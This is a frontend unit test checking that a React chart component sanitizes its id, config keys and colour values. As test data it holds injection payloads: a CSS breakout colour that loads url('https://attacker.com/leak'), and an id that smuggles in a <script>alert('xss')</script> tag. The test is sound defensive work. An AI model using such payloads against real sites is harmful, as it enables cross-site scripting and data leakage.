import { describe, test, expect, beforeAll } from "vitest";
import { render } from "@testing-library/react";
import { ChartContainer, type ChartConfig } from "../components/ui/chart";

beforeAll(() => {
  global.ResizeObserver = class {
    observe() {}
    unobserve() {}
    disconnect() {}
  } as unknown as typeof ResizeObserver;
});

describe("ChartContainer Security Sanitization", () => {
  test("sanitizes malicious id, config keys, and color values", () => {
    const maliciousConfig: ChartConfig = {
      "bad;key": {
        label: "Bad Key Test",
        color: 'red; } body { background: black; } url("https://attacker.com/leak")',
      },
      validKey: {
        label: "Valid Key Test",
        color: "hsl(12, 80%, 50%)",
      },
    };

    const { container } = render(
      <ChartContainer
        id='test-chart"><script>alert("xss")</script>'
        config={maliciousConfig}
      >
        <div />
      </ChartContainer>
    );

    const styleTag = container.querySelector("style");
    expect(styleTag).not.toBeNull();

    const styleContent = styleTag?.innerHTML || "";

    // Check that dangerous breakout characters and url() constructs are sanitized
    expect(styleContent).not.toContain('<script>alert("xss")</script>');
    expect(styleContent).not.toContain('body { background: black; }');
    expect(styleContent).not.toContain('url("https://attacker.com/leak")');

    // Check that sanitized key and safe colors are present
    expect(styleContent).toContain("--color-badkey:");
    expect(styleContent).toContain("--color-validKey: hsl(12, 80%, 50%)");
  });
});
